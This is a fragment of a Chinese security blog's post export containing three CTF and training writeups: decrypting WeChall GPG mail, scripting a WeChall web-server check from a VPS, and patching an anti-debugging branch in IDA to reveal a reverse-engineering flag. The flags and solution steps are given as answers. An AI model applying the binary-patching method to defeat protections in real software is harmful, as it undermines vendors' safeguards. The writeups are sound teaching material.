<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-gpg/setup.png" alt="setup"></p>
<p>WeChall 会向用户邮箱发送一封用此公钥加密后的邮件：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-gpg/encrypted-auth.png" alt="encrypted-auth"></p>
<p>注意，邮件内容不符合加密数据的存储格式，需要将其调整为标准格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PGP MESSAGE-----</span><br><span class="line">Version: GnuPG v2</span><br><span class="line"></span><br><span class="line">hQGMA8fQ72+bDdPvAQv/ZSO1r7T73G/HOUAG5OHtlZmiFiMN+4Zr2Ws2/9Jujw/j</span><br><span class="line">Y39hUGS+R7KFMJ9uArukWlsyF47fo6jPxsQkoOYlAGnFD14CbRu9RZB8iu0RX6F1</span><br><span class="line">M8yzbn5jsGENOVNExKUoX5XalAtRphGKKZyO+CneJp5JfEQ/nP7Now15MRhlUgd1</span><br><span class="line">SgGvU9aaNoetmYYWXmnPUkf+B7IiIzbgiDvOUXHMhj1nQ/uTxF447JXWsr7BymwW</span><br><span class="line">mN465mH64xmYI3Iw5syNnDx0uK8FSwbS/ogG0nC3xrupI/jWDl4ffGyq+0YvrLSf</span><br><span class="line">yHcTfWYH6gk6qP1ZCXzCgSJ9QjRkgiMg141+Fo+GufXomVUaNMyASt1hboCpIZT+</span><br><span class="line">Zxne9gZ/TEnylUPNejCzCpPyfHyLnxMO8ubpJ33O1N8gGCNx0yX/EunqoFnvJJ2z</span><br><span class="line">2YZVyXnORIdn+ecphGrj5vCFewQix4N1AjBRTFJfZ98CArfMKHoLehf5EAlbFaGM</span><br><span class="line">xiEA0gPVW92vcY7MPK3N0sDTAe7nyH9/V5u0Du/qki5ok4oyHwfglOE0eyAUg1jD</span><br><span class="line">O1IV08jW/EMIgiLQZk4RBXVeJh1s/x1ESj+p1Ic4/xenf4tC5OyuIkxEihsBUp6l</span><br><span class="line">Fe8rJIbSmDJnOzGmAMqSJvuyppiOklz+a9cQL7aTNwHr+CDnGP1A0gMX079+udue</span><br><span class="line">NQN1X1PlcjazJfcBAtqKRPPqjCNlRcYU/mZje0y/A7DxBZM5iF3CZ+nkUuR6crl2</span><br><span class="line">uA1ruWo0T3ECKnFX7KX3023LhPbAIss68K17t2Oz3+mw4jBjSD8ytAcgV9xHcXJn</span><br><span class="line">T1BdfajYueClzNbL+JB5z09T6tvh201h5guKhDbCfSEr2Z5egPlLfosVaNS6VdhN</span><br><span class="line">QCcuDhzogtBDGij6am0szcd1UfWPWCeISVVYWWyPx9IYTIAHtEzVqT7oA4s4UpZx</span><br><span class="line">ftT+Fnoh+CDKx62VI2RvHGNQtHZkN1Xm1CdMeQgVB0nFzvUPUldCV/78N9DQxY0f</span><br><span class="line">DY4BC2NMIB5iv4uY3CuiGJg5lDKhAmn6nGQ5mtl/HC3LjJ5LgQ==</span><br><span class="line">=Fxrl</span><br><span class="line">-----END PGP MESSAGE-----</span><br></pre></td></tr></table></figure>

<p>将此加密数据保存为文件 <code>auth</code>，在 Kali Linux 下进行解密：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Decrypt the encrypted data from WeChall</span></span><br><span class="line">gpg --output auth.html --decrypt auth</span><br></pre></td></tr></table></figure>

<p>其中 <code>--output</code> 参数指定解密后的输出文件名，<code>--decrypt</code> 参数需要解密的文件。注意，执行命令后要求输入私钥的授权口令，避免私钥被非法滥用。</p>
<p>解密后用浏览器打开 <code>auth.html</code>，发现明文邮件原来是一条验证链接：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-gpg/auth.png" alt="auth"></p>
<p>最后，点击链接跳转至 WeChall，提示公钥已成功存储，并且可以正常使用：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-gpg/success.png" alt="success"></p>
<h1 id="0x03-解密获得-flag"><a href="#0x03-解密获得-flag" class="headerlink" title="0x03 解密获得 flag"></a>0x03 解密获得 flag</h1><p>回到题目链接，点击 <strong>Send me encrypted mail please</strong> 后，WeChall 会将公钥加密过的 flag 发送至用户邮箱：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-gpg/encrypted-flag.png" alt="encrypted-flag"></p>
<p>同样地，将加密数据调整为标准格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PGP MESSAGE-----</span><br><span class="line">Version: GnuPG v2</span><br><span class="line"></span><br><span class="line">hQGMA8fQ72+bDdPvAQv9EQfqI9xc4JaK67/NDnNHFvd19qj0vk0nVnEKeTubCNj8</span><br><span class="line">z1rQ3hfZAKF/700FT3aWM0qkGKz/iTnEg0GxQa+Q3nMfnja3wBij2BjMqHYnQNsJ</span><br><span class="line">vLakqlPs83hM48N//qSSV+1jlprsoldUAr4Z9TswiYuKX3RZ1suxIGwlm7VFKOlX</span><br><span class="line">31VrkIC3qSE/sEwGuKH2yTuMbTJfX0wWc95iUFYrVPd0v3AtlARwKCoZQ8sMXZCB</span><br><span class="line">HtdlkQPNbpnvNl0rqaJCgtj76cetdot84QJNvE6MZCJ6dr0uOvnw4G0pupmUa8Ur</span><br><span class="line">vkZ5Q2FkiCynAz6ITu5ui6j+0p/TJe2ijI7mU2vCuMC6YxDzJsRv4m24EAJWilnU</span><br><span class="line">TXumU4EU/xYq+GIh7kL6MK5gQS5hFBpXAMSiXK/SYsFGTLOXDIMEdSwO573bdFOo</span><br><span class="line">ltBZMOQEunJ1UpPwctePDY8V2GNbJ0SCZJ2MU0B4/nnlTtYH/oXuDWsx4Dx3OZ0i</span><br><span class="line">HMnOyqpvZeK+tyFORB4h0sBHAf3YMRA610+FTAaXLkm7ot05fUC4rTKC07FuNu+I</span><br><span class="line">yjJv26Mm0eBlZLleZPGfVjWwZmWnhfRs7gJC24xIkWB+XGIZbvC7t4QuBTQXB1MM</span><br><span class="line">IjRgE0AkvxpJBonouWrLL93leJk+GQwKcQGG65kyz01eVx4xJIAHdjNGrwXaVYqk</span><br><span class="line">NWss9a1AswvPt4L1InlhSEw2/9wpojfv5V6UY0XE36rHhGWdaPhTrBTM/BL1kiX0</span><br><span class="line">zjNLjIkEZY+YtBiWK5GkuMFFtZzqYjfQ96N15hhiD1PfaTwk+8tVTdlIrgLVx8tX</span><br><span class="line">iOAfpVrUK1Bp3a8Uae5TjDu4NzrhyQwNPKGCjz2lBp/N1331/T/Q40I=</span><br><span class="line">=pxrG</span><br><span class="line">-----END PGP MESSAGE-----</span><br></pre></td></tr></table></figure>

<p>将此加密数据保存为文件 <code>flag</code>，同样在 Kali Linux 下进行解密：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Decrypt the encrypted flag from WeChall</span></span><br><span class="line">gpg --output flag.html --decrypt flag</span><br></pre></td></tr></table></figure>

<p>解密后用浏览器打开 <code>flag.html</code>，即可获得 flag：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-gpg/flag.png" alt="flag"></p>
<h1 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h1><p>本题只涉及到 GPG 的基本命令，让我们学会了如何生成公私钥对，以及如何加解密数据。</p>
<p>更全面的使用方法还需要继续专研实践，以下是几篇关于 GPG 的参考文章：</p>
<blockquote>
<p><a href="http://www.ruanyifeng.com/blog/2013/07/gpg.html">GPG入门教程</a><br><a href="https://seanxp.com/2017/02/gpg/">The GNU Privacy Guard</a><br><a href="https://www.jianshu.com/p/7f19ceacf57c">GPG密钥的生成与使用</a></p>
</blockquote>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Crypto</tag>
        <tag>RSA</tag>
        <tag>Linux</tag>
        <tag>WeChall</tag>
        <tag>GPG</tag>
      </tags>
  </entry>
  <entry>
    <title>【WeChall】 Training：WWW-Basics</title>
    <url>/2019/04/30/wechall-training-www-basics/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本题的思路很明确：搭建一个 Web 服务后，使 WeChall 能够访问特定网页的内容。</p>
<p>但问题来了，WeChall 是向用户登录的 IP 地址发起访问请求。一方面，运营商分配给普通用户的 IP 地址通常是经过多层 NAT 的，所有无法在个人 PC 上搭建 Web 服务，让公网用户访问；另一方面，租借一台 VPS 虽然能拥有公网独立 IP 地址，但服务器的操作系统通常是命令行界面，难以通过浏览器访问题目链接，再点击按钮使 WeChall 访问服务器的特定网页。</p>
<p>鉴于此，解决方案如下：<strong>租借一台 VPS 搭建起 Web 服务，通过 Python 脚本模拟浏览器访问题目链接，使 WeChall 成功访问服务器的特定网页</strong>。</p>
<ul>
<li>题目链接：<a href="https://www.wechall.net/challenge/training/www/basic/index.php">https://www.wechall.net/challenge/training/www/basic/index.php</a></li>
</ul>
<span id="more"></span>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-www-basics/question.png" alt="question"></p>
<h1 id="0x01-搭建-Web-服务"><a href="#0x01-搭建-Web-服务" class="headerlink" title="0x01 搭建 Web 服务"></a>0x01 搭建 Web 服务</h1><p>关于 VPS 的选取，经过调研后决定使用 <a href="https://www.vultr.com/">Vultr</a>，其提供的服务实惠便捷，非常适用于本题的小型部署实验场景。</p>
<p>值得一提的是， Vultr 同时支持支付宝与微信充值，方便了国内用户使用。创建完账户后，充值 10 美元能保证正常使用即可，VPS 是按时按量计费的，删除停用后将不会继续扣费。</p>
<h2 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h2><p>在服务器部署页面中，保持默认选择的云计算实例 <strong>Vultr Cloud Compute (VC2)</strong> 。第一步，选择地理位置，以 <strong>America -&gt; New York (NJ)</strong> 为例：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-www-basics/location.png" alt="location"></p>
<p>第二步，选择服务器类型。由于我们只需搭建 Web 服务，因此可选择一键部署应用，省去了自行部署环境的过程，以 <strong>Application -&gt; LEMP -&gt; CentOS 7</strong> 为例：</p>
<blockquote>
<p>小贴士：<a href="https://lemp.io/">LEMP</a> 是一组用于开发部署 Web 应用的自由软件的名称首字母缩写，通常指 Linux + Nginx + MySQL + PHP，使用说明请参考 <a href="https://www.vultr.com/docs/one-click-lemp">One-Click LEMP</a>。</p>
</blockquote>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-www-basics/type.png" alt="type"></p>
<p>第三步，选择服务器配置。由于实验所需的资源甚少，所以选择最低配置 <strong>$5&#x2F;mo</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-www-basics/size.png" alt="size"></p>
<p>其余设置可忽略，最后点击 <strong>Deploy Now</strong> 部署服务器。部署完成后，在 <strong>Servers</strong> 页面可看到 VPS 的概览：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-www-basics/overview.png" alt="overview"></p>
<p>可见，VPS 的 IP 地址为 <strong>45.63.23.131</strong>，在浏览器若能成功访问，则说明 Web 服务环境已部署完成：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-www-basics/index.png" alt="index"></p>
<p>此外，点击 <strong>··· -&gt; Server Details</strong> 可查看 VPS 的详情信息，包括系统用户名与口令，以及各种资源的使用情况：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-www-basics/detail.png" alt="detail"></p>
<h2 id="编写特定网页"><a href="#编写特定网页" class="headerlink" title="编写特定网页"></a>编写特定网页</h2><p>接下来，需要用终端模拟器远程控制 VPS，向特定网页写入内容。本文选用 <strong><a href="https://www.netsarang.com/en/xshell/">Xshell</a></strong> 进行连接，在新建会话属性框内，在 <strong>主机</strong> 栏中填入 IP 地址，在 <strong>名称</strong> 栏中按需自定义会话名称：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-www-basics/create.png" alt="create"></p>
<p>点击确定并连接后，在 SSH 安全警告框内点击 <strong>一次性接受</strong>，在 SSH 用户名框内输入 <strong>root</strong>，在 SSH 用户身份验证框内输入 VPS 详情中的口令。成功连接后，提示符将变为 <code>[root@vultr ~]#</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-www-basics/login.png" alt="login"></p>
<p>参考 One-Click LEMP 的使用说明，在 Xshell 中输入以下命令，向 <code>/usr/share/nginx/html/ciphersaw/ciphersaw.html</code> 文件内写入 <code>My name is ciphersaw and iChall.</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Enter the directory /usr/share/nginx/html</span></span><br><span class="line"><span class="built_in">cd</span> /usr/share/nginx/html</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create the directory ./ciphersaw and enter it</span></span><br><span class="line"><span class="built_in">mkdir</span> ciphersaw &amp;&amp; <span class="built_in">cd</span> ciphersaw</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write &quot;My name is ciphersaw and iChall.&quot; into ciphersaw.html</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;My name is ciphersaw and iChall.&quot;</span> &gt; ciphersaw.html</span><br></pre></td></tr></table></figure>

<blockquote>
<p>小贴士：若执行 <code>echo</code> 命令时不带参数 <code>-n</code>，则会在末尾自动添加换行符，导致不符合题目要求。此外，直接使用 <code>vim</code> 命令进行文本编辑，保存退出后也会出现上述问题。</p>
</blockquote>
<p>执行完上述命令后，若能在浏览器内访问 <strong>45.63.23.131&#x2F;ciphersaw&#x2F;ciphersaw.html</strong>，则说明题目要求的 Web 服务已搭建完成：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-www-basics/ciphersaw.png" alt="ciphersaw"></p>
<h1 id="0x02-安装依赖工具"><a href="#0x02-安装依赖工具" class="headerlink" title="0x02 安装依赖工具"></a>0x02 安装依赖工具</h1><p>CentOS 7 系统自带 Python 2.7.5，但未提供 Python 包管理工具 <strong>pip</strong>。因此，需要先用系统的包管理工具 yum 安装 pip，才能继续安装 Python 脚本中所需的 HTTP 网络通信库 <strong>requests</strong>。此外，建议先在个人 PC 上完成 Python 脚本的编辑，再将其上传至 VPS，所以还需要安装文件传输工具 <strong>lrzsz</strong>。</p>
<p>正常情况下，依次执行以下命令，可完成依赖工具的安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Install pip</span></span><br><span class="line">yum -y install python-pip</span><br><span class="line"></span><br><span class="line"><span class="comment"># Upgrade pip</span></span><br><span class="line">pip install --upgrade pip</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install requests</span></span><br><span class="line">pip install requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install lrzsz</span></span><br><span class="line">yum -y install lrzsz</span><br></pre></td></tr></table></figure>

<h1 id="0x03-人生苦短，我用-Python"><a href="#0x03-人生苦短，我用-Python" class="headerlink" title="0x03 人生苦短，我用 Python"></a>0x03 人生苦短，我用 Python</h1><p>通过 Python 脚本模拟浏览器访问 WeChall，关键点有两个：一是要<strong>携带用户身份认证信息</strong>，即我们熟知的 Cookie；二是要<strong>携带点击按钮发送的表单数据</strong>。</p>
<h2 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h2><p>Python 脚本主要是通过 <a href="https://requests.kennethreitz.org/en/master/">requests</a> 库向题目链接发送 POST 请求，模拟浏览器中的点击操作，使 WeChall 访问服务器的特定网页。</p>
<p>注意，由于个人 PC 与 VPS 的 IP 地址不同，因此在 PC 上登录 WeChall 用户时，切勿勾选 <strong>Restrict Session to this IP</strong>，否则 Cookie 与 PC 的 IP 地址绑定，导致在 VPS 上无法正常使用。</p>
<p>登录后进入题目链接，先按下 <strong>F12</strong> 打开 Chrome 浏览器的开发者工具，再点击页面中的按钮，在 <strong>Network -&gt; Name -&gt; Headers</strong> 中可查看当前用户的 Cookie 与表单数据的内容：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-www-basics/f12.png" alt="f12"></p>
<p>最后根据 Cookie 与表单数据编写出 Python 脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://www.wechall.net/challenge/training/www/basic/index.php&#x27;</span></span><br><span class="line">cookie = &#123;<span class="string">&#x27;WC&#x27;</span>: <span class="string">&#x27;11477596-43556-xxxxxxxxxxxxdYAW&#x27;</span>&#125;</span><br><span class="line">args = &#123;<span class="string">&#x27;port&#x27;</span>: <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;go&#x27;</span>: <span class="string">&#x27;I have set it up. Please check my server.&#x27;</span>&#125;</span><br><span class="line">res = requests.post(url, cookies = cookie, data = args)</span><br><span class="line"><span class="built_in">print</span> res.text</span><br></pre></td></tr></table></figure>

<h2 id="上传脚本"><a href="#上传脚本" class="headerlink" title="上传脚本"></a>上传脚本</h2><p>回到 Xshell，输入 <code>rz</code> 命令后，选择 Python 脚本文件（此处命名为 payload.py）上传即可：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-www-basics/payload.png" alt="payload"></p>
<h2 id="执行脚本"><a href="#执行脚本" class="headerlink" title="执行脚本"></a>执行脚本</h2><p>继续输入 <code>python payload.py</code> 执行脚本，若执行成功，则会在返回内容中出现相关提示：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-www-basics/result.png" alt="result"></p>
<h1 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h1><p>本题对初学者而言是非常好的锻炼，既能了解在 Linux 下搭建真实 Web 服务器的过程，又能学习如何使用 Python 脚本模拟浏览器发起访问请求。另外，建议感兴趣的同学尝试手动部署 LEMP 环境，这能够加深对 Web 服务器的理解。</p>
<p>最后的最后，用完了 VPS ，别忘了在 <strong>Servers</strong> 页面点击 <strong>Server Destroy</strong> 删除停用服务喔：)</p>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Web</tag>
        <tag>Python</tag>
        <tag>Linux</tag>
        <tag>Bash</tag>
        <tag>HTTP</tag>
        <tag>WeChall</tag>
        <tag>VPS</tag>
      </tags>
  </entry>
  <entry>
    <title>【XCTF 攻防世界】 Reverse —— csaw2013reversing2</title>
    <url>/2019/05/28/xctf-adworld-reverse-csaw2013reversing2/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>此题出自 CSAW CTF 2014，是分值为 200 的 Reverse 题，重点是使用 IDA <strong>对关键函数的逆向分析，并修改程序的运行流程</strong>后，得到正确结果。</p>
<p>题目链接：<a href="https://adworld.xctf.org.cn/challenges/details?hash=18180a7a-c677-44bd-92fc-84a382d318ae_2">https://adworld.xctf.org.cn/challenges/details?hash=18180a7a-c677-44bd-92fc-84a382d318ae_2</a></p>
<span id="more"></span>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/xctf-adworld-reverse-csaw2013reversing2/question.png" alt="question"></p>
<h1 id="0x01-逆向分析主函数"><a href="#0x01-逆向分析主函数" class="headerlink" title="0x01 逆向分析主函数"></a>0x01 逆向分析主函数</h1><p>依据题目的提示，双击程序后果然发现运行结果全是乱码：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/xctf-adworld-reverse-csaw2013reversing2/mess.png" alt="mess"></p>
<p>在 Kali Linux 中用 <code>file</code> 命令查看程序，发现是 Windows 下的 32 位 PE 文件：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/xctf-adworld-reverse-csaw2013reversing2/file.png" alt="file"></p>
<p>接下来，使用 IDA Pro 7.0 (32 bit) 打开程序，默认进入主函数的反汇编窗口，按下 <strong>F5</strong> 后进行反编译，自动生成类 C 语言的伪代码：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/xctf-adworld-reverse-csaw2013reversing2/main.png" alt="main"></p>
<p>可见，若 <code>sub_40102A()</code> 或 <code>IsDebuggerPresent()</code> 的返回值为真，则执行调试断点指令 <code>__debugbreak()</code>、子函数 <code>sub_401000(v3 + 4, lpMem)</code>、结果进程函数 <code>ExitProcess(0xFFFFFFFF)</code>，否则直接执行 <code>MessageBoxA(0, lpMem + 1, &quot;Flag&quot;, 2u)</code>，弹出全是乱码的 Flag 提示框。</p>
<p>双击 <code>sub_40102A()</code> 查看其反编译代码，发现返回值恒为零：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/xctf-adworld-reverse-csaw2013reversing2/sub-40102A.png" alt="sub-40102A"></p>
<p>而对于库函数 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/debugapi/nf-debugapi-isdebuggerpresent"><code>IsDebuggerPresent()</code></a>，若程序处于调试模式下，则返回值为非零；若未处于调试模式下，则返回值为零。显然，程序不处于调试模式下，即无法满足 <code>if</code> 语句的条件。</p>
<p>双击 <code>sub_401000()</code> 查看其反编译代码，目测是对以上乱码数据的解密函数：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/xctf-adworld-reverse-csaw2013reversing2/sub-401000.png" alt="sub-401000"></p>
<p>综上，解题思路大致为：<strong>进入 <code>if</code> 语句块，跳过调试断点，并执行解密函数，最终弹框输出 Flag。</strong></p>
<h1 id="0x02-修改运行流程"><a href="#0x02-修改运行流程" class="headerlink" title="0x02 修改运行流程"></a>0x02 修改运行流程</h1><p>在主函数的反汇编窗口中，核心的语句块如下：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/xctf-adworld-reverse-csaw2013reversing2/core.png" alt="core"></p>
<p>首先，<code>int 3</code> 中断即为调试断点指令，需将其改为空指令 <code>nop</code>。</p>
<p>将光标置于中断指令所在行，依次点击 <strong>Edit -&gt; Patch program -&gt; Assemble</strong>，弹出指令修改框：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/xctf-adworld-reverse-csaw2013reversing2/modify-int.png" alt="modify-int"></p>
<p>将 <code>int 3</code> 改为 <code>nop</code> 后点击 <strong>OK</strong> 即可。</p>
<blockquote>
<p>小贴士：点击 <strong>OK</strong> 后，IDA 会自动弹出下一条指令的修改框，通常无需修改，点击 <strong>Cancel</strong> 即可。</p>
</blockquote>
<p>根据上述操作，依次将 <code>jmp short loc_4010EF</code> 修改为 <code>jmp short loc_4010B9</code>，将 <code>jz short loc_4010B9</code> 修改为 <code>jmp short loc_401096</code>，修改完运行流程如下：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/xctf-adworld-reverse-csaw2013reversing2/modified.png" alt="modified"></p>
<p>最后，依次点击 <strong>Edit -&gt; Patch program -&gt; Apply patches to input file…</strong> ，弹出设置框，选择待打补丁程序，按需选择对原程序进行备份：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/xctf-adworld-reverse-csaw2013reversing2/apply-patches.png" alt="apply-patches"></p>
<p>设置完毕后点击 <strong>OK</strong> 即可。找到修改后的程序，双击执行可获得 <code>flag&#123;reversing_is_not_that_hard!&#125;</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/xctf-adworld-reverse-csaw2013reversing2/flag.png" alt="flag"></p>
<h1 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h1><p>本题要求挑战者精确定位核心函数，分析并正确修改程序的运行流程，得到解密数据。对于逆向初学者而言，不仅锻炼了基础的逆向分析能力，还掌握了使用 IDA 修改汇编指令等基本操作。</p>
<p>本题的其他 writeup 还可参考：</p>
<blockquote>
<p><a href="https://github.com/ctfs/write-ups-2014/tree/master/csaw-ctf-2014/csaw2013reversing2.exe">CSAW CTF 2014: csaw2013reversing2.exe</a><br><a href="https://www.mrt-prodz.com/blog/view/2014/09/csaw-ctf-quals-2014---csaw2013reversing2exe-200pts-writeup">CSAW CTF Quals 2014 - csaw2013reversing2.exe (200pts) writeup</a><br><a href="https://infamoussyn.wordpress.com/2014/09/22/csaw-ctf-qual-2014-csaw2013reversing2-exe-writeup/">CSAW CTF QUAL 2014 – CSAW2013REVERSING2.EXE WRITEUP</a></p>
</blockquote>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>XCTF</tag>
        <tag>攻防世界</tag>
        <tag>Reverse</tag>
        <tag>Disassembly</tag>
        <tag>Decompile</tag>
        <tag>IDA</tag>
        <tag>PE</tag>
      </tags>
  </entry>
</search>
